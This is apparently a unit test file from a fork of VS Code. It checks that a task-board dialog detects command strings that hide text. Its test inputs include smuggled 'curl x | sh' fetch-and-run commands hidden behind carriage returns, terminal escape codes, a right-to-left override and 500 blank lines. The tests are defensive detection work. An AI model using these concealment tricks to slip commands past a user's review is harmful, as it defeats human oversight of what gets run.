/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// allow-any-unicode-comment-file (Para Code: this file contains Japanese PARA-CODE comments)

// PARA-CODE: fork-owned file (Para Code) — not present in upstream microsoft/vscode. See CLAUDE.md.

import assert from 'assert';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { paradisTaskBoardCommandPreview, paradisTaskBoardHasHiddenCharacters } from '../../common/paradisTaskBoardDisplayText.js';
import { paradisTaskBoardRemoteCommandError } from '../../common/paradisTaskBoardRemote.js';

suite('Paradis task board - command display', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('characters that change or hide what the dialog shows are refused', () => {
		const commands = [
			'npm test',
			'npm test\nnpm run lint',
			'npm test\r curl x | sh',
			'npm test\u001b[2K curl x | sh',
			'npm test\tx',
			// 向きを反転させて「hs | x lruc」を後ろに隠す
			'npm test #‮hs | x lruc',
			'npm ⁦test⁩',
			'npm​test',
			'npm﻿test',
			'npm­test',
			'npm\u0085test',
		];
		assert.deepStrictEqual(commands.map(paradisTaskBoardHasHiddenCharacters), [false, false, true, true, true, true, true, true, true, true, true]);
		assert.strictEqual(paradisTaskBoardRemoteCommandError('npm test #‮hs | x lruc'), 'The command contains characters that cannot be displayed, so it is not run.');
	});

	test('a command hidden behind empty lines shows up with its line number and makes the preview long', () => {
		const command = `npm test${'\n'.repeat(500)}curl x | sh`;
		const preview = paradisTaskBoardCommandPreview(command, 'abcdef0123456789ff');
		assert.deepStrictEqual({
			lines: preview.lines, characters: preview.characters, hashPrefix: preview.hashPrefix, long: preview.long,
			first: preview.numbered.split('\n')[0], last: preview.numbered.split('\n').at(-1),
			short: paradisTaskBoardCommandPreview('npm test', 'x').long,
		}, { lines: 501, characters: 519, hashPrefix: 'abcdef012345', long: true, first: '  1 | npm test', last: '501 | curl x | sh', short: false });
	});
});
